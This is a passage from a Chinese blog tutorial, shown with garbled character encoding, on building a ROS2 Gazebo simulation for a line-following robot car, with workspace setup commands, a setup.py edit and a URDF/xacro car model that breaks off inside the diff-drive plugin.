-            <div class="postBody">
-                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<h3 id="ä¸æ¦è¿°">ä¸ãæ¦è¿°</h3>
-<h4 id="11-ä¸ºä»ä¹è¦ä»¿ç">1.1 ä¸ºä»ä¹è¦ä»¿ç</h4>
-<p>æ­å»º<code>Gazebo</code>ä»¿çç¯å¢å¯¹äºæºè½è½¦æ¯èµï¼ç¹å«æ¯æ¶åè§è§å·¡çº¿ãå¼ºåå­¦ä¹ ç­ç®æ³å¼åï¼æ¥è¯´ï¼ä¸æ¯å¯éé¡¹ï¼èæ¯æä¼è§£ãä»¥ä¸æ¯éè¦æ­å»ºä»¿çç¯å¢çæ ¸å¿çç±ï¼ä»¥åå®è½è§£å³çå®éé®é¢ã</p>
-<h5 id="111--ç¡¬ä»¶ä¸è¶³">1.1.1  ç¡¬ä»¶ä¸è¶³</h5>
-<p>é®é¢ï¼ä½ ç°å¨æ²¡æä¹ä¹æ´¾ãæåå¤´ãçµæºç­ç¡¬ä»¶ï¼ä½éè¦åç¨åºãéªè¯ç®æ³ã</p>
-<p><code>Gazebo</code>çä½ç¨ï¼</p>
-<ul>
-<li>æä¾èæçå°è½¦æ¨¡åï¼å¸¦æåå¤´ãæ¿åé·è¾¾ç­ä¼ æå¨ï¼ï¼</li>
-<li>æä¾èæçèµéç¯å¢ï¼å¯ä»¥èªå®ä¹é¢è²ãå½¢ç¶ãæè´¨ï¼ï¼</li>
-<li>ç¨åºåå®åï¼ç´æ¥å¨<code>Gazebo</code>éè¿è¡ï¼ææç­åäºå¨çè½¦ä¸æµè¯ï¼</li>
-</ul>
-<p>ç»æï¼ç¡¬ä»¶è¿æ²¡å°ï¼ä½ çå·¡çº¿ç®æ³å·²ç»è·éäºãç¡¬ä»¶ä¸å°ï¼åªéæ¢åºå±é©±å¨å³å¯ã</p>
-<h5 id="112-ç¼©ç­è°è¯å¨æ">1.1.2 ç¼©ç­è°è¯å¨æ</h5>
-<table>
-<thead>
-<tr>
-<th style="text-align: left">è°è¯åºæ¯</th>
-<th style="text-align: left">çè½¦è°è¯</th>
-<th style="text-align: left">Gazeboä»¿ç</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align: left">ä¿®æ¹PIDåæ°</td>
-<td style="text-align: left">ç§å½âä¸çµâè·ä¸åâè§å¯âåç§å½ï¼5-10åé/æ¬¡ï¼</td>
-<td style="text-align: left">æ¹ä»£ç âä¿å­âéå¯ä»¿çï¼10ç§/æ¬¡ï¼</td>
-</tr>
-<tr>
-<td style="text-align: left">å°è½¦æå¢</td>
-<td style="text-align: left">å¯è½æåç¡¬ä»¶ï¼çµæºãèµæºãè½¦æ¶ï¼</td>
-<td style="text-align: left">éç½®ä½ç½®ï¼ç»§ç»­è°è¯</td>
-</tr>
-<tr>
-<td style="text-align: left">è·å®ä¸æ´å</td>
-<td style="text-align: left">éè¦æ¸åºãåçµãé²æ­¢æäºº</td>
-<td style="text-align: left">æ éå¶è¿è¡ï¼æ äººå¼å®</td>
-</tr>
-<tr>
-<td style="text-align: left">æµè¯æç«¯æåµ</td>
-<td style="text-align: left">å¯è½ç¿»è½¦ãå¤±æ§</td>
-<td style="text-align: left">å®å¨å®å¨</td>
-</tr>
-</tbody>
-</table>
-<p>ç»è®ºï¼ä»¿çç¯å¢è®©çè°è¯æçæå30-50åã</p>
-<h5 id="113-æä¾å¯å¤ç°çæµè¯ç¯å¢">1.1.3 æä¾å¯å¤ç°çæµè¯ç¯å¢</h5>
-<p>é®é¢ï¼çè½¦æµè¯æ¶ï¼åçº¿ååãå°é¢æ©æ¦åãçµæ± çµéé½ä¼å½±åç»æï¼ä»å¤©è·éçä»£ç æå¤©å¯è½å°±å¤±æã</p>
-<p><code>Gazebo</code>çä¼å¿ï¼</p>
-<ul>
-<li>æ¯æ¬¡å¯å¨é½æ¯å®å¨ç¸åçç¯å¢ï¼ç¸åçåç§ãç¸åçæ©æ¦åãç¸åçä¼ æå¨åªå£°ï¼;</li>
-<li>å¯ä»¥ç²¾ç¡®æ§å¶åéï¼æ¯å¦åªæ¹åçº¿æ¡é¢è²ï¼å¶ä»ä¸å;</li>
-<li>ç®æ³æ§è½åååªç±ä»£ç æ¹å¨å¼èµ·ï¼æé¤äºç¯å¢å¹²æ°ï¼</li>
-</ul>
-<p>è¿å¯¹äºè°åãå¯¹æ¯ç®æ³ä¼å£è³å³éè¦ã</p>
-<h5 id="114-æ¯æå¼ºåå­¦ä¹ è®­ç»">1.1.4 æ¯æå¼ºåå­¦ä¹ è®­ç»</h5>
-<p>å¼ºåå­¦ä¹ éè¦æ°ç¾ä¸æ¬¡è¯éï¼è¿å¨çè½¦ä¸å®å¨ä¸å¯è½ï¼</p>
-<table>
-<thead>
-<tr>
-<th style="text-align: left">è®­ç»éæ±</th>
-<th style="text-align: left">çè½¦</th>
-<th style="text-align: left">Gazeboä»¿ç</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align: left">è¯éæ¬¡æ°</td>
-<td style="text-align: left">å ç¾æ¬¡å°±æ¥åº</td>
-<td style="text-align: left">æ éæ¬¡</td>
-</tr>
-<tr>
-<td style="text-align: left">è®­ç»éåº¦</td>
-<td style="text-align: left">1åé</td>
-<td style="text-align: left">å¯ä»¥å éå°10-100å</td>
-</tr>
-<tr>
-<td style="text-align: left">å¹¶è¡è®­ç»</td>
-<td style="text-align: left">éè¦å¤å°çè½¦</td>
-<td style="text-align: left">å¼å¤ä¸ªGazeboå®ä¾</td>
-</tr>
-<tr>
-<td style="text-align: left">å¤ä½ææ¬</td>
-<td style="text-align: left">æå¨æ¬åèµ·ç¹</td>
-<td style="text-align: left">ä»£ç ä¸é®å¤ä½</td>
-</tr>
-</tbody>
-</table>
-<p>å®ä¾ï¼è®­ç»ä¸ä¸ªç®åçå·¡çº¿<code>RL</code>æ¨¡åï¼çè½¦å¯è½éè¦<code>3</code>ä¸ªæ+æå<code>5</code>å°è½¦ï¼ä»¿çåªéè¦<code>1</code>å¨+çµè´¹ã</p>
-<h5 id="115-æååç°ç®æ³ç¼ºé·">1.1.5 æååç°ç®æ³ç¼ºé·</h5>
-<p>ä»¿çä¸­å¯ä»¥è½»æ¾å¶é "äºæåºæ¯"ï¼</p>
-<ul>
-<li>çªç¶çå¼ºåç§å°ï¼æ¨¡æé³åç´å°æåå¤´ï¼ï¼</li>
-<li>èµéä¸ææ±¡æ¸ï¼æ¨¡æçº¿æ¡é¨åç¼ºå¤±ï¼ï¼</li>
-<li>ä¼ æå¨æéï¼æ¨¡ææä¸ªåç´ åç¹ï¼ï¼</li>
-</ul>
-<p>è¿äºå¨çè½¦ä¸å¾é¾å»æå¶é ï¼ä½å¨ä»¿çä¸­å¯ä»¥éæ¶å¼å¯ãæåè®©ä½ çç®æ³éåºè¿äºæåµï¼æ¯èµæ¶å°±ä¸ä¼ç¿»è½¦ã</p>
-<h4 id="12-ç¯å¢æ­å»ºæ­¥éª¤">1.2 ç¯å¢æ­å»ºæ­¥éª¤</h4>
-<p>èµ°é©¬è§ç¢ç»<code>Gazebo</code>ä»¿çç¯å¢æ­å»ºä¸»è¦åå«ä»¥ä¸å ä¸ªæ­¥éª¤ï¼</p>
-<p>â  ç¯å¢åå¤ï¼<code>ubuntu</code> + <code>ROS2</code>ï¼ï¼è¿ä¸ªå¯ä»¥åèã<a href="https://www.cnblogs.com/zyly/p/19318463" target="_blank"><code>ROS2</code>æ¦è¿°ååºäº<code>RK3588</code>çç¯å¢æ­å»º</a>ãï¼</p>
-<p>â¡ å°è½¦å»ºæ¨¡ï¼<code>URDF</code>ï¼ï¼æå³<code>URFD</code>ä»ç»å¯ä»¥åèã<a href="https://www.cnblogs.com/zyly/p/19384606" target="_blank"><code>ROS2</code>ä¹<code>URDF</code>å»ºæ¨¡</a>ãï¼</p>
-<p>â¢ èµéå»ºæ¨¡ï¼<code>World</code>ï¼ï¼</p>
-<p>â£ è§è§å·¡çº¿ç®æ³å¼åã</p>
-<h5 id="121-å·¥ç¨ç®å½ç®ä»">1.2.1 å·¥ç¨ç®å½ç®ä»</h5>
-<p>æä»¬å¯ä»¥ååå»ºå·¥ç¨ç®å½ï¼åå»ºç®å½<code>car_ws</code>ï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:~$ cd /opt/2k0300/loongson_2k300_lib
-zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib$ mkdir -p car_ws/src
-zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib$ cd car_ws/src
-</code></pre>
-<p>å®æ´çç®å½ç»æå¤§è´å¦ä¸ï¼è¿ä¸ªæä»¬åç»­åå®¹ä¼ä¾æ¬¡åå»ºï¼</p>
-<pre><code class="language-shell">car_ws/
-âââ src/
-â   âââ car_description/      # åè½å1ï¼æºå¨äººURDFæ¨¡å
-â   âââ car_gazebo/           # åè½å2ï¼Gazeboä»¿ç
-â   âââ car_vision/           # åè½å3ï¼è§è§ç®æ³
-</code></pre>
-<p>å¨<code>ROS</code>çå¼åè§èä¸­ï¼<code>src/</code> ä¸çæ¯ä¸ªå­ç®å½å«åè½åï¼<code>Package</code>ï¼ï¼èä¸æ¯ç¬ç«é¡¹ç®ãå®ä»¬å±åç»æä¸ä¸ªå®æ´çæºå¨äººé¡¹ç®ã</p>
-<table>
-<thead>
-<tr>
-<th style="text-align: left">åè½å</th>
-<th style="text-align: left">èè´£</th>
-<th style="text-align: left">ä¿®æ¹é¢ç</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align: left"><code>car_description</code></td>
-<td style="text-align: left">å°è½¦çç©çæ¨¡åï¼å°ºå¯¸ãé¢è²ãä¼ æå¨ä½ç½®ï¼</td>
-<td style="text-align: left">ä½ï¼ç¡¬ä»¶ç¡®å®åå¾å°æ¹ï¼</td>
-</tr>
-<tr>
-<td style="text-align: left"><code>car_gazebo</code></td>
-<td style="text-align: left">ä»¿çç¯å¢ãèµéãå¯å¨èæ¬ãçæå°è½¦</td>
-<td style="text-align: left">ä¸­ï¼æ¢èµéæ¶éè¦æ¹ï¼</td>
-</tr>
-<tr>
-<td style="text-align: left"><code>car_vision</code></td>
-<td style="text-align: left">å¾åå¤çãå·¡çº¿ç®æ³</td>
-<td style="text-align: left">é«ï¼å¤©å¤©è°åï¼</td>
-</tr>
-</tbody>
-</table>
-<h5 id="122-åè½åå³ç³»">1.2.2 åè½åå³ç³»</h5>
-<p>åè½åä¹é´çåä½å³ç³»å¦ä¸ï¼</p>
-<pre><code class="language-shell">å¯å¨é¡ºåºï¼
-1. car_gazebo å¯å¨ä»¿çä¸çï¼çæå°è½¦æ¨¡å
-   âââ è°ç¨ car_description ä¸­ç car.urdf æè¿°å°è½¦é¿ä»ä¹æ ·
-
-2. car_vision è®¢éæåå¤´å¾å
-   âââ å¤çå¾å â åå¸éåº¦æä»¤
-
-3. car_gazebo ä¸­ç Gazebo æ¥æ¶éåº¦æä»¤
-   âââ é©±å¨ä»¿çå°è½¦è¿å¨
-</code></pre>
-<h3 id="äºå°è½¦å»ºæ¨¡">äºãå°è½¦å»ºæ¨¡</h3>
-<p><code>car_description</code>ç¨äºå®ä¹å°è½¦çç©çæ¨¡åï¼å°ºå¯¸ãé¢è²ãä¼ æå¨ä½ç½®ï¼ãåå»º<code>car_description</code>ç<code>Python</code>çæ¬çåè½åï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws/src$ ros2 pkg create --build-type ament_python car_description
-</code></pre>
-<p>è¿è¡æååï¼ç»ç«¯ä¼æ¾ç¤ºåå»ºçæä»¶åç®å½ä¿¡æ¯ãæ­¤æ¶ï¼ <code>car_description</code> åè½åç®å½ç»æå°å¦ä¸æç¤ºï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws/src$ tree ./car_description/
-./car_description/
-âââ car_description  # æ ¸å¿Pythonæ¨¡åç®å½ï¼ç¨äºå­æ¾Pythonä»£ç 
-â   âââ __init__.py
-âââ package.xml      # åè½åçæè¿°æä»¶ï¼å«ä¾èµä¿¡æ¯ï¼
-âââ resource         # èµæºæä»¶å¤¹
-â   âââ car_description
-âââ setup.cfg        # setuptools çéç½®æä»¶ 
-âââ setup.py         # Python åçå®è£èæ¬
-âââ test             # æµè¯æä»¶å¤¹
-</code></pre>
-<h4 id="21-å­ç®å½">2.1 å­ç®å½</h4>
-<p>åè½ååå»ºå¥½äºï¼ä½æç§è§åæä»¬éè¦å¨ <code>car_description</code> ä¸­å­æ¾å°è½¦ç<code>URDF</code>æ¨¡åæä»¶ãè¿äºä¸æ¯<code>.py</code>æä»¶ï¼æ¾å¨èªå¨çæç <code>car_description</code> å­ç®å½ä¸å¹¶ä¸åéã</p>
-<p>æä»¬å¯ä»¥æå¨åå»ºå¤ä¸ªç®å½æ¥æ´å¥½å°ç»ç»æä»¶ï¼</p>
-<ul>
-<li><code>urdf</code>: ä¸é¨å­æ¾ <code>.urdf</code> æ <code>.xacro</code> æ¨¡åæä»¶ï¼</li>
-<li><code>launch</code>ï¼ä¿å­ç¸å³å¯å¨æä»¶ï¼</li>
-<li><code>rviz</code>ï¼ä¿å­<code>rviz</code>çéç½®æä»¶ï¼</li>
-<li><code>meshes</code>ï¼æ¾ç½®<code>URDF</code>ä¸­å¼ç¨çæ¨¡åæ¸²ææä»¶ï¼</li>
-<li><code>config</code>: å­æ¾<code>Gazebo</code>æ§å¶å¨çéç½®æä»¶ã</li>
-</ul>
-<p>å¨ç»ç«¯ä¸­æ§è¡ï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws/src$ cd car_description/
-zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws/src/car_description$ mkdir urdf config launch rviz meshes
-</code></pre>
-<p>æä»¬éè¦ä¿®æ¹<code>setup.py</code>æä»¶ï¼æ·»å éç½®æä»¶ï¼</p>
-<pre><code class="language-python">import os
-from glob import glob
-
-    ...
-
-    data_files=[
-        ('share/ament_index/resource_index/packages',
-            ['resource/' + package_name]),
-        ('share/' + package_name, ['package.xml']),
-        (os.path.join('share', package_name, 'launch'), glob(os.path.join('launch', '*.launch.py'))),
-        (os.path.join('share', package_name, 'urdf'), glob(os.path.join('urdf', '*.*'))),
-        (os.path.join('share', package_name, 'urdf/sensors'), glob(os.path.join('urdf/sensors', '*.*'))),
-        (os.path.join('share', package_name, 'meshes'), glob(os.path.join('meshes', '*.*'))),
-        (os.path.join('share', package_name, 'rviz'), glob(os.path.join('rviz', '*.rviz'))),
-        (os.path.join('share', package_name, 'config'), glob(os.path.join('config', '*.*'))),
-    ],
-
-    ...
-</code></pre>
-<h4 id="22-æ¨¡åæä»¶">2.2 æ¨¡åæä»¶</h4>
-<p>æ¥ä¸æ¥å°±æ¯ç¼åä¸ä¸ªå®æ´ç <code>car.xacro</code> æä»¶ï¼è¿ä¸ªæ¨¡ååå«è½¦èº«ãä¸ä¸ªè½®å­ãæåå¤´ä¼ æå¨ï¼å¹¶ä¸éç½®äº<code>Gazebo</code>ä»¿çæéçæä»¶;</p>
-<ul>
-<li>æå³<code>URDF</code>è¯­æ³å¯ä»¥åèã<a href="https://www.cnblogs.com/zyly/p/19384606" target="_blank"><code>ROS2</code>ä¹<code>URDF</code>å»ºæ¨¡</a>ã;</li>
-<li>æå³<code>XACRO</code>è¯­æ³å¯ä»¥åèã<a href="https://www.cnblogs.com/zyly/p/19389513" target="_blank"><code>ROS2</code>ä¹<code>Gazebo</code>ç©çä»¿çå¹³å°</a>ãã</li>
-</ul>
-<p>é¦åè¿å¥ <code>urdf</code> ç®å½å¹¶åå»ºæä»¶ï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws/src/car_description$ cd urdf/
-zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws/src/car_description/urdf$ vim car.xacro
-</code></pre>
-<p>åå®¹å¦ä¸ï¼</p>
-<details>
-<summary>ç¹å»æ¥çè¯¦æ</summary>
-<pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
-&lt;robot name="f_car_model" xmlns:xacro="http://www.ros.org/wiki/xacro"&gt;
-
-  &lt;!-- ==================== 1. æ ¸å¿åæ°å®ä¹ (åºäºå®æµæ°æ®) ==================== --&gt;
-
-  &lt;!-- è½¦èº«å°ºå¯¸ (åä½ï¼ç±³) --&gt;
-  &lt;!-- æ»é¿23.2cm = ååºç14cm + åæ¯æ¶9.2cm --&gt;
-  &lt;xacro:property name="main_body_len" value="0.14"/&gt;   &lt;!-- åé¨åºç 14cm --&gt;
-  &lt;xacro:property name="main_body_width" value="0.16"/&gt; &lt;!-- åé¨å®½ 16cm --&gt;
-  &lt;xacro:property name="main_body_height" value="0.064"/&gt; &lt;!-- è½¦èº«æ»é« 6.4cm --&gt;
-
-  &lt;xacro:property name="nose_len" value="0.092"/&gt;      &lt;!-- åé¨æ¯æ¶ 9.2cm --&gt;
-  &lt;xacro:property name="nose_width" value="0.072"/&gt;    &lt;!-- åé¨å®½ 7.2cm --&gt;
-  &lt;xacro:property name="nose_height" value="0.064"/&gt;   &lt;!-- ä¸è½¦èº«åé« --&gt;
-
-  &lt;!-- è½®å­åæ° (ç´å¾6.4cm) --&gt;
-  &lt;xacro:property name="wheel_diameter" value="0.064"/&gt;
-  &lt;xacro:property name="wheel_radius" value="0.032"/&gt;
-  &lt;xacro:property name="wheel_width" value="0.027"/&gt;   &lt;!-- å®½åº¦2.7cm --&gt;
-  &lt;xacro:property name="wheel_track" value="0.155"/&gt;   &lt;!-- è½®è·15.5cm --&gt;
-
-  &lt;!-- ä¸åè½®åæ° --&gt;
-  &lt;!-- ä¸åè½®æ´ä½åæ° --&gt;
-  &lt;xacro:property name="caster_total_height" value="0.058"/&gt;  &lt;!-- æ»é«5.8cm --&gt;
-  &lt;xacro:property name="caster_total_width" value="0.028"/&gt;  &lt;!-- æ»å®½2.8cm --&gt;
-  &lt;xacro:property name="caster_small_wheel_radius" value="0.006"/&gt; &lt;!-- å°è½®åå¾1.2cm --&gt;
-  &lt;xacro:property name="caster_offset_x" value="0.116"/&gt;  &lt;!-- ä¸åè½®ä½äºåé¨æ¯æ¶ä¸æ¹ --&gt;
-  
-  &lt;!-- ä¸åè½®æ¯æ¶åç§»ï¼ä½¿å°è½®æ¥è§¦å°é¢ï¼ --&gt;
-  &lt;xacro:property name="caster_mount_height" value="${caster_total_height - caster_small_wheel_radius*2}"/&gt;
-
-  &lt;!-- æåå¤´å®è£ä½ç½® --&gt;
-  &lt;xacro:property name="camera_x" value="${main_body_len/2 + nose_len/2}"/&gt; &lt;!-- è½¦å¤´æåç«¯ --&gt;
-  &lt;xacro:property name="camera_y" value="0.0"/&gt;
-  &lt;xacro:property name="camera_z" value="0.2"/&gt;        &lt;!-- ç«æ --&gt;
-  &lt;xacro:property name="camera_pitch" value="0.2"/&gt;    &lt;!-- ä¿¯è§è§åº¦çº¦11.5åº¦ --&gt;
-  &lt;xacro:property name="camera_roll" value="0.0"/&gt;
-  &lt;xacro:property name="camera_yaw" value="0.0"/&gt;
-
-  &lt;!-- è´¨éåæ°ï¼æ ¹æ®å®éå°ºå¯¸è°æ´ï¼ --&gt;
-  &lt;xacro:property name="mass_body" value="0.65"/&gt;
-  &lt;xacro:property name="mass_wheel" value="0.08"/&gt;
-  &lt;xacro:property name="mass_caster" value="0.03"/&gt;
-  &lt;xacro:property name="mass_caster_mount" value="0.02"/&gt;
-
-  &lt;!-- ==================== 2. æè´¨å®ä¹ ==================== --&gt;
-  &lt;material name="black"&gt;
-    &lt;color rgba="0.1 0.1 0.1 1.0"/&gt;
-  &lt;/material&gt;
-  &lt;material name="blue"&gt;
-    &lt;color rgba="0.0 0.0 0.6 1.0"/&gt;
-  &lt;/material&gt;
-  &lt;material name="white"&gt;
-    &lt;color rgba="0.9 0.9 0.9 1.0"/&gt;
-  &lt;/material&gt;
-  &lt;material name="silver"&gt;
-    &lt;color rgba="0.7 0.7 0.7 1.0"/&gt;
-  &lt;/material&gt;
-  &lt;material name="gray"&gt;
-    &lt;color rgba="0.4 0.4 0.4 1.0"/&gt;
-  &lt;/material&gt;
-
-  &lt;!-- ==================== 3. å®å®ä¹ï¼è½®å­ ==================== --&gt;
-  &lt;xacro:macro name="wheel" params="prefix parent *origin"&gt;
-    &lt;link name="${prefix}_wheel"&gt;
-      &lt;visual&gt;
-        &lt;geometry&gt;
-          &lt;cylinder radius="${wheel_radius}" length="${wheel_width}"/&gt;
-        &lt;/geometry&gt;
-        &lt;material name="black"/&gt;
-        &lt;origin xyz="0 0 0" rpy="1.5707 0 0"/&gt; &lt;!-- æè½¬90åº¦è®©è½®å­ç«èµ·æ¥ --&gt;
-      &lt;/visual&gt;
-      &lt;collision&gt;
-        &lt;geometry&gt;
-          &lt;cylinder radius="${wheel_radius}" length="${wheel_width}"/&gt;
-        &lt;/geometry&gt;
-        &lt;origin xyz="0 0 0" rpy="1.5707 0 0"/&gt;
-      &lt;/collision&gt;
-      &lt;inertial&gt;
-        &lt;mass value="${mass_wheel}"/&gt;
-        &lt;inertia ixx="0.0005" ixy="0.0" ixz="0.0" iyy="0.0005" iyz="0.0" izz="0.0005"/&gt;
-      &lt;/inertial&gt;
-    &lt;/link&gt;
-
-    &lt;joint name="${prefix}_wheel_joint" type="continuous"&gt;
-      &lt;parent link="${parent}"/&gt;
-      &lt;child link="${prefix}_wheel"/&gt;
-      &lt;axis xyz="0 1 0"/&gt; &lt;!-- ç»Yè½´æè½¬ --&gt;
-      &lt;xacro:insert_block name="origin"/&gt;
-    &lt;/joint&gt;
-
-    &lt;!-- Gazebo è½®èæ©æ¦å±æ§ --&gt;
-    &lt;gazebo reference="${prefix}_wheel"&gt;
-      &lt;material&gt;Gazebo/Black&lt;/material&gt;
-      &lt;mu1 value="1.2"/&gt; &lt;!-- æ©æ¦ç³»æ° --&gt;
-      &lt;mu2 value="1.2"/&gt;
-      &lt;kp value="10000000.0" /&gt;
-      &lt;kd value="10.0" /&gt;
-    &lt;/gazebo&gt;
-  &lt;/xacro:macro&gt;
-
-  &lt;!-- ==================== 4. è½¦èº«ä¸»ä½ (Base Link) ==================== --&gt;
-  &lt;link name="base_link"&gt;
-    &lt;!-- è§è§é¨åï¼åé¨ä¸»ä½ --&gt;
-    &lt;visual&gt;
-      &lt;origin xyz="0 0 0" rpy="0 0 0"/&gt;
-      &lt;geometry&gt;
-        &lt;box size="${main_body_len} ${main_body_width} ${main_body_height}"/&gt;
-      &lt;/geometry&gt;
-      &lt;material name="blue"/&gt;
-    &lt;/visual&gt;
-
-    &lt;!-- è§è§é¨åï¼åé¨çªæ¯æ¶ --&gt;
-    &lt;visual&gt;
-      &lt;origin xyz="${main_body_len/2 + nose_len/2} 0 0" rpy="0 0 0"/&gt;
-      &lt;geometry&gt;
-        &lt;box size="${nose_len} ${nose_width} ${nose_height}"/&gt;
-      &lt;/geometry&gt;
-      &lt;material name="silver"/&gt;
-    &lt;/visual&gt;
-
-    &lt;!-- ç¢°æå±æ§ (ç®åä¸ºä¸¤ä¸ªçå­ï¼æé«ä»¿çç¨³å®æ§) --&gt;
-    &lt;collision&gt;
-      &lt;origin xyz="0 0 0" rpy="0 0 0"/&gt;
-      &lt;geometry&gt;
-        &lt;box size="${main_body_len} ${main_body_width} ${main_body_height}"/&gt;
-      &lt;/geometry&gt;
-    &lt;/collision&gt;
-    &lt;collision&gt;
-      &lt;origin xyz="${main_body_len/2 + nose_len/2} 0 0" rpy="0 0 0"/&gt;
-      &lt;geometry&gt;
-        &lt;box size="${nose_len} ${nose_width} ${nose_height}"/&gt;
-      &lt;/geometry&gt;
-    &lt;/collision&gt;
-
-    &lt;!-- æ¯æ§åæ° (éå¿ç¥å¾®åç§»ï¼æ¨¡æçµæºéé) --&gt;
-    &lt;inertial&gt;
-      &lt;origin xyz="-0.02 0 0" rpy="0 0 0"/&gt;
-      &lt;mass value="${mass_body}"/&gt;
-      &lt;inertia ixx="0.0035" ixy="0.0" ixz="0.0" iyy="0.0055" iyz="0.0" izz="0.007"/&gt;
-    &lt;/inertial&gt;
-  &lt;/link&gt;
-
-  &lt;!-- ==================== 5. è½®å­å®ä¾å ==================== --&gt;
-  &lt;!-- å·¦åè½® --&gt;
-  &lt;xacro:wheel prefix="left" parent="base_link"&gt;
-    &lt;origin xyz="${-main_body_len/2 + 0.01} ${wheel_track/2} ${-wheel_radius}" rpy="0 0 0"/&gt;
-  &lt;/xacro:wheel&gt;
-
-  &lt;!-- å³åè½® --&gt;
-  &lt;xacro:wheel prefix="right" parent="base_link"&gt;
-    &lt;origin xyz="${-main_body_len/2 + 0.01} ${-wheel_track/2} ${-wheel_radius}" rpy="0 0 0"/&gt;
-  &lt;/xacro:wheel&gt;
-
-  &lt;!-- ==================== 6. ä¸åè½®ï¼å®æ´ç»æï¼ ==================== --&gt;
-  
-  &lt;!-- ä¸åè½®æ¯æ¶ --&gt;
-  &lt;link name="caster_mount"&gt;
-    &lt;visual&gt;
-      &lt;geometry&gt;
-        &lt;box size="0.04 0.028 0.058"/&gt;
-      &lt;/geometry&gt;
-      &lt;material name="gray"/&gt;
-      &lt;origin xyz="0 0 0" rpy="0 0 0"/&gt;
-    &lt;/visual&gt;
-    &lt;collision&gt;
-      &lt;geometry&gt;
-        &lt;box size="0.04 0.028 0.058"/&gt;
-      &lt;/geometry&gt;
-    &lt;/collision&gt;
-    &lt;inertial&gt;
-      &lt;mass value="${mass_caster_mount}"/&gt;
-      &lt;inertia ixx="0.0001" ixy="0.0" ixz="0.0" iyy="0.0001" iyz="0.0" izz="0.0001"/&gt;
-    &lt;/inertial&gt;
-  &lt;/link&gt;
-
-  &lt;joint name="caster_mount_joint" type="fixed"&gt;
-    &lt;parent link="base_link"/&gt;
-    &lt;child link="caster_mount"/&gt;
-    &lt;origin xyz="${caster_offset_x} 0 ${-main_body_height/2}" rpy="0 0 0"/&gt;
-  &lt;/joint&gt;
-
-  &lt;!-- ä¸åè½®å°è½® --&gt;
-  &lt;link name="caster_small_wheel"&gt;
-    &lt;visual&gt;
-      &lt;geometry&gt;
-        &lt;cylinder radius="${caster_small_wheel_radius}" length="0.02"/&gt;
-      &lt;/geometry&gt;
-      &lt;material name="black"/&gt;
-      &lt;origin xyz="0 0 0" rpy="1.5707 0 0"/&gt;
-    &lt;/visual&gt;
-    &lt;collision&gt;
-      &lt;geometry&gt;
-        &lt;cylinder radius="${caster_small_wheel_radius}" length="0.02"/&gt;
-      &lt;/geometry&gt;
-      &lt;origin xyz="0 0 0" rpy="1.5707 0 0"/&gt;
-    &lt;/collision&gt;
-    &lt;inertial&gt;
-      &lt;mass value="${mass_caster}"/&gt;
-      &lt;inertia ixx="0.00005" ixy="0.0" ixz="0.0" iyy="0.00005" iyz="0.0" izz="0.00005"/&gt;
-    &lt;/inertial&gt;
-  &lt;/link&gt;
-
-  &lt;joint name="caster_small_wheel_joint" type="continuous"&gt;
-    &lt;parent link="caster_mount"/&gt;
-    &lt;child link="caster_small_wheel"/&gt;
-    &lt;axis xyz="1 0 0"/&gt;  &lt;!-- ç»Xè½´æè½¬ï¼æ¨¡æä¸åè½®å°è½®æ»å¨ --&gt;
-    &lt;origin xyz="0 0 ${-caster_total_height/2 + caster_small_wheel_radius}" rpy="0 0 0"/&gt;
-  &lt;/joint&gt;
-
-  &lt;!-- Gazebo ä¸åè½®å±æ§ --&gt;
-  &lt;gazebo reference="caster_mount"&gt;
-    &lt;material&gt;Gazebo/Gray&lt;/material&gt;
-    &lt;mu1 value="0.3"/&gt;
-    &lt;mu2 value="0.3"/&gt;
-  &lt;/gazebo&gt;
-
-  &lt;gazebo reference="caster_small_wheel"&gt;
-    &lt;material&gt;Gazebo/Black&lt;/material&gt;
-    &lt;mu1 value="0.8"/&gt;
-    &lt;mu2 value="0.8"/&gt;
-  &lt;/gazebo&gt;
-
-  &lt;!-- ==================== 7. æåå¤´é¾æ¥ ==================== --&gt;
-  &lt;link name="camera_link"&gt;
-    &lt;visual&gt;
-      &lt;geometry&gt;
-        &lt;box size="0.04 0.04 0.04"/&gt;
-      &lt;/geometry&gt;
-      &lt;material name="black"/&gt;
-    &lt;/visual&gt;
-  &lt;/link&gt;
-
-  &lt;joint name="camera_joint" type="fixed"&gt;
-    &lt;parent link="base_link"/&gt;
-    &lt;child link="camera_link"/&gt;
-    &lt;!-- æåå¤´å®è£å¨è½¦å¤´ç«æé¡¶ç«¯ --&gt;
-    &lt;origin xyz="${camera_x} ${camera_y} ${camera_z}" rpy="${camera_roll} ${camera_pitch} ${camera_yaw}"/&gt;
-  &lt;/joint&gt;
-
-  &lt;!-- ==================== 8. Gazebo æä»¶ ==================== --&gt;
-  &lt;gazebo&gt;
-    &lt;plugin name="differential_drive_controller" filename="libgazebo_ros_diff_drive.so"&gt;
-      &lt;rosDebugLevel&gt;Debug&lt;/rosDebugLevel&gt;
-      &lt;publishWheelTF&gt;false&lt;/publishWheelTF&gt;
-      &lt;robotNamespace&gt;/&lt;/robotNamespace&gt;
-      &lt;publishTf&gt;1&lt;/publishTf&gt;
-      &lt;publishWheelJointState&gt;true&lt;/publishWheelJointState&gt;
-      &lt;alwaysOn&gt;true&lt;/alwaysOn&gt;
-      &lt;updateRate&gt;50.0&lt;/updateRate&gt;
-      &lt;left_joint&gt;left_wheel_joint&lt;/left_joint&gt;
-      &lt;right_joint&gt;right_wheel_joint&lt;/right_joint&gt;
-      &lt;wheel_separation&gt;${wheel_track}&lt;/wheel_separation&gt;
-      &lt;wheel_diameter&gt;${wheel_diameter}&lt;/wheel_diameter&gt;
